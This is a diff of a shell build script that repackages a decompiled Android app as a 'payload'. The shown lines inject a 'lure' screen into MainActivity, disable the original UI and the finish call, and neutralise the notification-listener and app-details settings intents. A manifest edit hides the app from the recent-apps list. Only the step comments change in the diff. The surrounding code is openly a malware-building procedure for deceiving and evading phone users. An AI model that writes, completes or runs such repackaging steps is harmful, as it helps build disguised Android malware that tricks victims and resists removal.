@@ -26,7 +26,7 @@ chmod +x patch_payload.sh
 sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
 ./patch_payload.sh
 
-# 4. Create Lure
+# 4. Create Lure (Fixed Smali Semicolons)
 cat > lure.smali <<LURE
     const/4 v0, 0x7
     new-array v0, v0, [Ljava/lang/String;
@@ -65,7 +65,7 @@ cat > lure.smali <<LURE
     invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
 LURE
 
-# 5. Inject
+# 5. Inject (Fixed address match with semicolon)
 sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r lure.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 sed -i "s|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|# Original UI disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
@@ -74,5 +74,5 @@ sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTIN
 sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
 sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-# 7. Manifest
+# 7. Manifest Update (Simplified)
 sed -i "s|$NEW_PKG.MainActivity|$NEW_PKG.MainActivity\" android:excludeFromRecents=\"true\"|g" payload_source/AndroidManifest.xml
